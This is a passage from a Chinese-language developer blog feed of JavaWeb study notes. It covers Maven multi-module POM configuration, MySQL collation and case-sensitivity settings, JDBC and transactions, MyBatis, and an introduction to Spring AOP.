class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 父模块坐标 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>parent-module<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span> <span class="comment">&lt;!-- 父模块 packaging 必须为 pom --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 子模块列表 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>child-module-1<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 依赖管理 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 插件管理 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>子POM配置</p><ol><li>父模块引用：子模块需通过<code>&lt;parent&gt;</code>引用父模块</li><li>依赖声明：子模块需在<code>&lt;dependencies&gt;</code>中声明依赖，版本由父模块管理。</li><li>独立性：子模块应尽量独立，避免循环依赖</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">&lt;!-- 引用父模块 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>parent-module<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">&lt;!-- 子模块坐标 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>child-module-1<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">&lt;!-- 依赖声明 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="模块化管理"><a href="#模块化管理" class="headerlink" title="模块化管理"></a>模块化管理</h4><ul><li>模块化管理好处<ul><li>统一版本：在父模块中统一管理依赖版本，子模块无需重复指定</li><li>避免冲突：确保依赖版本一致，避免冲突</li></ul></li></ul><ol><li><p><strong>依赖管理</strong></p><ol><li><p>核心思想：父POM（Project Object Model）文件可以集中管理依赖库的版本号，子模块中只需要引用依赖不需要再指定版本号，确保所有子模块都使用相同的版本，并且简化了依赖的升级过程</p></li><li><p>父pom.xml：使用<code>&lt;dependencyManagement&gt;</code>元素来声明所有需要管理的依赖项。在这里，你应该指定依赖的groupId、artifactId和version。这些信息将用于定义依赖库的标准版本</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>example-dependency<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 其他依赖 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>子pom.xml：子模块的pom.xml应该继承自父POM。在子模块中，你只需要引用依赖(自动引用)而不需要再次声明版本号，因为版本已经被父POM中的<code>&lt;dependencyManagement&gt;</code>部分所管理</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>example-dependency<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 注意这里没有version元素 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 其他依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>插件管理</strong></p><ol><li>统一配置：在父模块中统一配置插件，子模块可<strong>继承或覆盖</strong></li><li>统一管理插件版本，也可以使用<code>&lt;pluginManagement&gt;</code>元素在父POM中声明插件及其版本，然后在子模块中仅引用插件而不必重复版本信息</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--父pom--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uild</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- Maven 编译插件 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- Maven Surefire 插件（用于单元测试） --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.22.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">skipTests</span>&gt;</span>false<span class="tag">&lt;/<span class="name">skipTests</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 子pom --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 使用父模块中定义的 maven-compiler-plugin --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 覆盖父模块中 maven-surefire-plugin 的配置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">skipTests</span>&gt;</span>true<span class="tag">&lt;/<span class="name">skipTests</span>&gt;</span> <span class="comment">&lt;!-- 覆盖父模块的配置 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://www.runoob.com/maven/maven-tutorial.html">菜鸟教程</a></li><li>deepseek</li></ol>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb3_设计模式</title>
      <link href="/2024/12/12/JavaWeb3_%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2024/12/12/JavaWeb3_%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>DesignPattern思想与结构为大</p></blockquote><h2 id="结构型模式"><a href="#结构型模式" class="headerlink" title="结构型模式"></a>结构型模式</h2><h3 id="Decorator"><a href="#Decorator" class="headerlink" title="Decorator"></a>Decorator</h3><ol><li>本质：python中的装饰器体现的一样，在不改变核心功能的情况增加新的处理，进行一层包装，在java中体现为类的形式，通常支持任意组合</li></ol><h2 id="Facade"><a href="#Facade" class="headerlink" title="Facade"></a>Facade</h2><ol><li>本质：外观模式</li></ol>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb2_JDBC</title>
      <link href="/2024/12/12/JavaWeb2_JDBC/"/>
      <url>/2024/12/12/JavaWeb2_JDBC/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是JDBC"><a href="#什么是JDBC" class="headerlink" title="什么是JDBC"></a>什么是JDBC</h2><h3 id="先搞个MySQL玩玩"><a href="#先搞个MySQL玩玩" class="headerlink" title="先搞个MySQL玩玩"></a>先搞个MySQL玩玩</h3><h4 id="配置一下"><a href="#配置一下" class="headerlink" title="配置一下"></a>配置一下</h4><blockquote><p>太久没有用mysql把密码给忘了，搜了下教程解决了<br>banner: mysql 8.0.37</p></blockquote><ol><li>包治百病[<a href="https://blog.csdn.net/qq_43342301/article/details/91288891]">https://blog.csdn.net/qq_43342301/article/details/91288891]</a><ol><li>其中跳过密码登录再本地需要自己指定文件并administrator权限，<code>mysqld --defaults-file=&quot;D:\MySQL_Server_8_Data\my.ini&quot; --console --skip-grant-tables --shared-memory</code></li><li>其他照着时评里说的就ok</li></ol></li><li>创建一个数据库，这里有个项目需要跑，刚刚好，注意大小写<ol><li><strong>字符集与校对规则collation</strong><ol><li>字符集定义了字符的编码方式，而校对规则决定了这些字符如何被比较和排序。<ol><li>每个字符集至少有一个对应的校对规则，但通常会有多个，以满足不同语言和地区的需求。</li><li>当选择一个字符集时，默认会应用该字符集的默认校对规则，但你可以根据需要为数据库、表或列指定不同的校对规则。</li></ol></li><li>COLLATE后缀含义：<ol><li>_ci: case insensitive 不区分大小写</li><li>_cs：case sensitive 区分大小写</li><li>_ai： accent insensitive 不区分重音</li><li>_as: accent sensitive 区分重音</li><li>_bin：binary case sensitive collation，binary 以二进制方式，区分大小写和重音符号。</li></ol></li><li>MySQL常用排序规则有：utf8mb4_general_ci、utf8mb4_unicode_ci、utf8mb4_bin、utf8mb4_0900_ai_ci<ol><li>_ai_ci：按照特定语言或地区方式比较字符串，不区分大小写和重音符号。</li><li>_unicode_ci： 按 Unicode 标准方式比较字符串，不区分大小写和重音符号。</li><li>_general_ci：按一般方式比较字符串，不区分大小写和重音符号。</li></ol></li></ol></li><li><strong>大小写敏感性</strong><ol><li>一篇不错的文章，详细看里面的就ok[<a href="https://blog.csdn.net/weixin_49114503/article/details/136523591]">https://blog.csdn.net/weixin_49114503/article/details/136523591]</a></li><li><strong>数据库和表名&#x2F;表别名</strong><ol><li>查看数据库名和表名的大小敏感性<code>show variables like &quot;%case%&quot;;</code><ol><li>在Unix系统中，数据库名和表名的大小写是敏感的在</li><li>Windows系统中，数据库名和表名的大小写不敏感，存储和查找时会转换为小写。</li><li>在macOS系统中，数据库名和表名的大小写是敏感的，但在查询时会转换为小写。</li><li>在大小写不敏感的系统中（Windows和macOS），不能将lower_case_table_names设置为0。</li><li>可以通过修改配置文件或设置字段属性来控制大小写敏感性。</li></ol></li><li>修改库名及表名大小写敏感<ol><li>mysql8.0安装初始化之后是不能更改lower_case_table_names的(官方文档)：In MySQL 8.0, the lower_case_table_names variable can only be configured when the MySQL server is initialized</li><li>解决方法：<ol><li>方法一：在初始化的时候就要设置好这个变量的值</li><li>方法二：删除数据目录，重新初始化(执行命令前切记先备份好数据，此方法并没有亲自试验过，切记慎重使用)</li></ol></li><li>一般不用修改到数据库名与表名</li></ol></li></ol></li><li><strong>列名大小写不敏感</strong><ol><li>列名与列的别名在所有的情况下均是忽略大小写的 ,不管是Linux系统还是Windows系统下MySQL的列名都默认不区分大小写</li></ol></li><li><strong>字段大小写敏感与排序</strong><ol><li>排序与校对规则：在比较时候使用的</li><li>字段内容大小写敏感<ol><li>不管是windows还是Linux系统，mysql在任何系统上字符串内容默认是不区分大小写的。若想要字段内容区分大小写，可以设置字段编码大小写敏感</li><li><strong>修改整个表的编码集</strong><ol><li>查看<code>show table status from &lt;database_name/schema&gt; like &#39;&lt;table_name&gt;&#39;;</code></li><li>修改<code>alter table &lt;table_name&gt; character set &lt;encoding_format&gt; collate &lt;encoding_rules&gt;;</code>编码集合可以是utf8_general_ci</li></ol></li><li><strong>修改某个字段的编码集</strong><ol><li>查看<code>show full columns from table_name where field=&#39;field_name&#39;</code></li><li>修改<code>alter table &lt;table_name&gt; modify &lt;field_name&gt; &lt;field_type&gt; character  set &lt;encoding_rule&gt; not null;</code>比如<code>alter table  tb  modify  name varchar(10)  character  set  utf8  not null;</code></li></ol></li><li><strong>在查询中指定是否敏感</strong><ol><li>敏感<code>SELECT * FROM test1 WHERE name like &#39;%B%&#39; COLLATE utf8mb4_bin;</code></li><li>不敏感<code>SELECT * FROM test1 WHERE name like &#39;%B%&#39; COLLATE utf8mb4_general_ci;</code></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol><h4 id="复习一下"><a href="#复习一下" class="headerlink" title="复习一下"></a>复习一下</h4><blockquote><p>sql注入太久没写给忘光了</p></blockquote><ol><li>表操作<ol><li>查看表结构<code>DESC &lt;table_name&gt;;</code></li><li>查看字段<code>SELECT &lt;column_name&gt; FROM &lt;table_name&gt; WHERE &lt;column_name&gt;=&lt;value&gt;;</code></li><li>插入一行<code>INSERT INTO &lt;table_name&gt; (column1, column2, column3) VALUES (value1, value2, value3);</code>多行使用逗号,隔开values</li></ol></li></ol><h3 id="Transaction-事务"><a href="#Transaction-事务" class="headerlink" title="Transaction: 事务"></a>Transaction: 事务</h3><h3 id="Batch-批处理"><a href="#Batch-批处理" class="headerlink" title="Batch: 批处理"></a>Batch: 批处理</h3><ol><li>Batch与Transaction的关系<ol><li>批处理一般不支持多个事务，否则难以保证一致性，对资源锁的占有还有管理复杂度这些问题</li><li>多个&#x2F;一个批处理构成一个事务</li></ol></li></ol><h2 id="Spring中访问数据库"><a href="#Spring中访问数据库" class="headerlink" title="Spring中访问数据库"></a>Spring中访问数据库</h2><h3 id="JdbcTemplate"><a href="#JdbcTemplate" class="headerlink" title="JdbcTemplate"></a>JdbcTemplate</h3><ol><li>对JDBC接口的进一步封装，旨在对资源的声明周期进行自管理</li></ol><h3 id="声明式事务"><a href="#声明式事务" class="headerlink" title="声明式事务"></a>声明式事务</h3><ol><li>通过配置文件或注解来指定哪些方法应该运行在一个事务上下文中，而不是在业务逻辑代码中显式地编写事务控制语句（如<code>beginTransaction()</code>、<code>commit()</code>或<code>rollback()</code>）</li><li>事务的传播是在同一个线程中通过ThreadLocal实现的</li></ol><h3 id="DAO-Data-Access-Object"><a href="#DAO-Data-Access-Object" class="headerlink" title="DAO: Data Access Object"></a>DAO: Data Access Object</h3><ol><li>顾名思义：实际上就是与数据访问相关的类对象，提供curd操作，实现对数据访问的封装，将数据访问层与业务逻辑层相分离(术业有专攻)，<strong>有和实体对象进行了绑定，不再单纯的数据访问操作，但是又和实际上的model进行区别</strong>，总结就<strong>桥梁</strong></li><li>嵌套结构与对应功能</li></ol><h3 id="ORM-Object-Relational-Mapping"><a href="#ORM-Object-Relational-Mapping" class="headerlink" title="ORM: Object Relational Mapping"></a>ORM: Object Relational Mapping</h3><h4 id="概念知一二"><a href="#概念知一二" class="headerlink" title="概念知一二"></a>概念知一二</h4><ol><li><strong>核心思想</strong>: 将程序中的对象映射到关系型数据库中的表</li><li>实现<ol><li><strong>实体类与数据库表的映射</strong>: 类的属性与数据库表的列一一对应。每个对象实例对应数据库表中的一条记录</li><li><strong>CURD操作</strong>: 操作这些对象时，ORM框架会自动生成相应的SQL语句，并通过数据库连接执行这些语句，从而实现数据的插入、更新、删除和查询</li></ol></li></ol><h4 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h4><ol><li>Mybatis是半自动化的ORM框架，但它并不像 Hibernate 那样完全自动化地将对象映射到数据库表中，更像是一个<strong>SQL映射框架</strong><ol><li><p><strong>SQL语句的自控制</strong>: 与全ORM框架不同的是，MyBatis并不自动生成SQL语句，允许开发人员直接书写 SQL 语句，并通过绑定参数和结果集映射来实现对象关系映射的功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用xml语句自定义语句，#&#123;&#125;安全插入</span></span><br><span class="line">&lt;select id=<span class="string">&quot;selectUserById&quot;</span> parameterType=<span class="string">&quot;int&quot;</span> resultType=<span class="string">&quot;com.example.User&quot;</span>&gt;</span><br><span class="line">   SELECT id, name, password FROM users <span class="type">WHERE</span> <span class="variable">id</span> <span class="operator">=</span> #&#123;id&#125;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>对象映射</strong>: 可以将查询结果映射成 Java 对象，但不会自动建立对象之间的关系</p></li></ol></li></ol><h4 id="Mybatis-Undone"><a href="#Mybatis-Undone" class="headerlink" title="Mybatis Undone"></a>Mybatis Undone</h4><ol><li>一二级缓存</li><li>延迟加载</li><li>xml中定义的sql语句与自动代理</li></ol>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb1_Spring</title>
      <link href="/2024/12/08/JavaWeb1_Spring/"/>
      <url>/2024/12/08/JavaWeb1_Spring/</url>
      
        <content type="html"><![CDATA[<blockquote><p>!!!JavaWeb0其实是在《Java安全6(1)_初始JavaWbe》那里，这里直接进入Spring了<br>ai时代了，思想、设计与创造力更加重要</p></blockquote><h2 id="IoC"><a href="#IoC" class="headerlink" title="IoC"></a>IoC</h2><h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><h3 id="AOP概念原理一二三解"><a href="#AOP概念原理一二三解" class="headerlink" title="AOP概念原理一二三解"></a>AOP概念原理一二三解</h3><ol><li><p>AOP(Aspect Oriented Programming): 面向切面编程</p></li><li><p><em><strong>为什么要有AOP</strong></em></p><ol><li><strong>OOP有所不足</strong><ol><li>面向对象的特点：是对个体进行抽象来构成全体的运行，对于实现类则实现了该个体应该具有的全部方法与属性，类似于图书管理员需要addBook(), updateBook(), deleteBook()这样子</li><li>OPP局限：我们关注这个个体的核心逻辑，在于管理书籍，但是在这个过程中看能需要统一对书籍进行log()登记日志, check()信息检查这些功能，需要重复的代码片段(即使抽象为函数也有&#x2F;组合)，统一管理&#x2F;修改比较难，并且没有体现单一职责和开闭原则的思想，对于这一问题其实还有下列的方法<ol><li>proxy模式，但是proxy模式比较麻烦，必须先抽取接口，然后，针对每个方法实现Proxy；虽然实现了单一的职责，但是并没有成功做到<strong>泛化和减重</strong></li></ol></li></ol></li><li><strong>AOP特点</strong><ol><li><strong>核心思想</strong><ol><li>AOP将功能看作一个一个的面，有些类负责一个个切面的功能比如log(), 